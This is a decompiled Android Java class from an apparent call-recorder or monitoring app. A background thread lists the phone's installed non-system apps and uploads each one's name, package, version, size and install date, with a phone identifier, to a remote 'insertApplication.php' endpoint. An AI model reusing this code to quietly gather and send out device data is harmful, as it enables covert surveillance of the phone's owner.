package com.yasoka.spcallrecord.recorder.call.a.c.h;

import a.c.e.e;
import a.c.j.c;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import com.crashlytics.android.Crashlytics;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

/* compiled from: SendAppsRefresh */
public class a extends Thread {

    /* renamed from: a reason: collision with root package name */
    private final Context f257a;

    public a(Context context) {
        this.f257a = context;
    }

    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:21:0x0061 */
    public void run() {
        String str;
        String str2;
        String str3 = "";
        try {
            PackageManager packageManager = this.f257a.getPackageManager();
            for (ApplicationInfo applicationInfo : packageManager.getInstalledApplications(128)) {
                if ((applicationInfo.flags & 1) == 0 || (applicationInfo.flags & 128) == 128) {
                    String charSequence = applicationInfo.loadLabel(packageManager).toString();
                    String b2 = c.b();
                    try {
                        SimpleDateFormat d2 = c.d();
                        long j = packageManager.getPackageInfo(applicationInfo.packageName, 0).firstInstallTime;
                        Calendar instance = Calendar.getInstance();
                        instance.setTimeInMillis(j);
                        b2 = d2.format(instance.getTime());
                    } catch (NameNotFoundException e2) {
                        e2.getStackTrace();
                    } catch (Exception e3) {
                        e3.getStackTrace();
                        e3.getStackTrace();
                        Crashlytics.logException(e3);
                    }
                    try {
                        str = c.a(new File(applicationInfo.sourceDir).length());
                    } catch (Exception e4) {
                        e4.printStackTrace();
                        str = str3;
                    }
                    String str4 = applicationInfo.packageName;
                    try {
                        str2 = packageManager.getPackageInfo(applicationInfo.packageName, 0).versionName;
                    } catch (NameNotFoundException e5) {
                        e5.getStackTrace();
                        str2 = str3;
                    }
                    HashMap hashMap = new HashMap();
                    StringBuilder sb = new StringBuilder();
                    sb.append(str3);
                    sb.append(e.e(this.f257a));
                    hashMap.put("idPhone", sb.toString());
                    hashMap.put("name", charSequence);
                    hashMap.put("namePackage", str4);
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append(str3);
                    sb2.append(str2);
                    hashMap.put("version", sb2.toString());
                    hashMap.put("size", str);
                    hashMap.put("installDate", b2);
                    hashMap.put("stateApp", "0");
                    a.c.e.a.b("applications/insertApplication.php", (Map<String, String>) hashMap);
                }
            }
        } catch (Exception e6) {
            e6.getStackTrace();
            try {
                e6.getStackTrace();
                Crashlytics.logException(e6);
            } catch (Exception unused) {
            }
        }
    }
}
